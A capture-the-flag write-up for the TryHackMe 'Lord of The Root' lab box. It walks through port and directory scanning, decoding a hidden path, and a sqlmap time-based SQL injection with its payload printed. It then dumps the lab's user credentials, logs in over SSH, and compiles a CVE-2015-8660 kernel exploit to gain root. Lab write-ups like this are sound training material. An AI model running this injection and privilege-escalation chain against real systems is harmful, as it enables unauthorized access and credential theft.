# Lord of The Root


## Task 1 - Connect to our network
No answer needed

## Task 2 - Can you root the box?
```
export IP=10.10.24.251
```

### 1 --  Do your basic reconnaissance. What ports do you see open?
Initial nmap scan:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Lord of The Root$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 23:29 MDT
Nmap scan report for 10.10.24.251
Host is up (0.13s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.44 seconds
```

All ports nmap scan:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Lord of The Root$ nmap -p- -sC -sV -Pn -n -oN nmap/all_ports $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 23:30 MDT
Nmap scan report for 10.10.24.251
Host is up (0.13s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2319.43 seconds
```

### 2 --  Hmmm, what method is used to reveal hidden ports?
```
port knocking
```

### 3 --  What port is the hidden service on?
```
1337
```

### 4 --  Do recon on the hidden service.

Running a little bit of gobuster and nikto on the device can give us some additional endpoints to check out:

Initial gobuster scan:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Lord of The Root$ gobuster dir -u http://$IP:1337 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.24.251:1337
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/30 00:11:09 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/images (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/05/30 00:12:12 Finished
===============================================================
```

Initial nikto scan:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Lord of The Root$ nikto -url http://$IP:1337
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.24.251
+ Target Hostname:    10.10.24.251
+ Target Port:        1337
+ Start Time:         2020-05-30 00:11:22 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
```

Just checking out the web page itself, we see at the website's root we just get a static image displayed:


![root](https://user-images.githubusercontent.com/32188816/83321423-d54b2380-a20c-11ea-9adb-4f130668a1a2.png)


Following a typical recon check list for finding low-hanging fruit is to view the source of the page, which shows us nothing useful other than the `/images` endpoint we found from gobuster and nikto. Continuing the same process but for the `/images` directory. Here we have three files that I downloaded and spent some time doing stegonography analysis on, which turned out to be a dead end. Moving on to the next endpoint in the list we have the default Apache icons README page at `/icons/README`, but what is on the `/icons/` endpint? Taking a look we find nothing but another photo:


![icons](https://user-images.githubusercontent.com/32188816/83321444-f01d9800-a20c-11ea-8ed9-6d65199c47fe.png)


What about the page source? In the source we find a comment with what looks like base64 encoded data:


![icons_source](https://user-images.githubusercontent.com/32188816/83321466-25c28100-a20d-11ea-8e2f-d5c5abdb9b55.png)


Trying to base64 decode this data gives us a hint that we are getting closer, and after decoding this comment twice we find a new endpoint `/978345210/index.php`:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Lord of The Root$ echo 'THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh' | base64 -d
Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!
jeffrowell@kali:~/Documents/TryHackMe/Lord of The Root$ echo 'Lzk3ODM0NTIxMC9pbmRleC5waHA=' | base64 -d
/978345210/index.php
jeffrowell@kali:~/Documents/TryHackMe/Lord of The Root$
```

Now navigating to `/978345210/index.php` gives us a login page:


![login](https://user-images.githubusercontent.com/32188816/83321519-949fda00-a20d-11ea-9af1-2c3b8a72503a.png)


### 5 --  Can you some how obtain user credentials
First thing that comes to mind is to throw sqlmap or hydra at the web login form to fuzz for an SQLi or a brute force login. Starting with sqlmap, it was able to find that the `password` parameter is vulnerable to an SQLi:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Lord of The Root$ sqlmap -u http://$IP:1337/978345210/index.php --forms --risk=3 --level=5 -p username,password --dbs
                                                            .
                                                            .
                                                            .
                                                            .
                                                            .
                                                            .
                                                            .
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 11876 HTTP(s) requests:
---
Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=RybM&password=' AND (SELECT 6856 FROM (SELECT(SLEEP(5)))hziG)-- dvCJ&submit= Login
---
```


Once the inital sqlmap scan completes, we know the following database names:

```bash
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] Webapp
```

Since we have the names, we can try to dump everything out of the `Webapp` table to get login credentials:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Lord of The Root$ sqlmap -u http://$IP:1337/978345210/index.php --forms --risk=3 --level=5 --dbms=mysql -D Webapp --dump
                                                                              .
                                                                              .
                                                                              .
                                                                              .
                                                                              .
                                                                              .
                                                                              .
Database: Webapp
Table: Users
[5 entries]
+------+----------+------------------+
| id   | username | password         |
+------+----------+------------------+
| 1    | frodo    | iwilltakethering |
| 2    | smeagol  | MyPreciousR00t   |
| 3    | aragorn  | AndMySword       |
| 4    | legolas  | AndMyBow         |
| 5    | gimli    | AndMyAxe         |
+------+----------+------------------+
```

Using the credentials to log in to the web app gives us nothing other than a another photo and nothing useful in the page source. We found SSH open earlier, so maybe these creds can be used for SSH too. As it turns out, `smeagol`'s credentials allow us to get into the box. Once on the box running linpeas finds a vulnerable Ubuntu 14 version:

```bash
====================================( Basic information )=====================================
OS: Linux version 3.19.0-25-generic (buildd@lgw01-57) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015
User & Groups: uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
Hostname: LordOfTheRoot
Writable folder: /home/smeagol
```

### 6 --  Whats the method to exploit the system for privilege escalation called?

Researching the vulnerable Linux version linpeas found, we found a vulnerable linux version that will allow us to get root, but there were also three interesting files in the `/SECRET` directory which have the SUID bit set and take in a user input string which seems to get passed to the vulnerable `strcpy()` function. I didn't go this route but it seems we could also leverage this buffer overflow to escalate privileges.
```
buffer overflow
```

### 7 --  Who wrote the message in the flag message in the roots home directory?

The vulnerability related to this linux version is [CVE-2015-8660](https://nvd.nist.gov/vuln/detail/CVE-2015-8660) and exploitDB has an [exploit](https://www.exploit-db.com/exploits/39166) for this that we can leverage to get root. Downloading the source code from exploitDB and putting it into a file on the server, compiling, then running gets us root access:

```bash
smeagol@LordOfTheRoot:/tmp$ vi exploit.c
smeagol@LordOfTheRoot:/tmp$ gcc exploit.c -o exploit
smeagol@LordOfTheRoot:/tmp$ ./exploit
root@LordOfTheRoot:/tmp# id
uid=0(root) gid=1000(smeagol) groups=0(root),1000(smeagol)
root@LordOfTheRoot:/tmp# cd /root
root@LordOfTheRoot:/root# ls
buf  buf.c  Flag.txt  other  other.c  switcher.py
root@LordOfTheRoot:/root# cat Flag.txt
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf
root@LordOfTheRoot:/root#
```
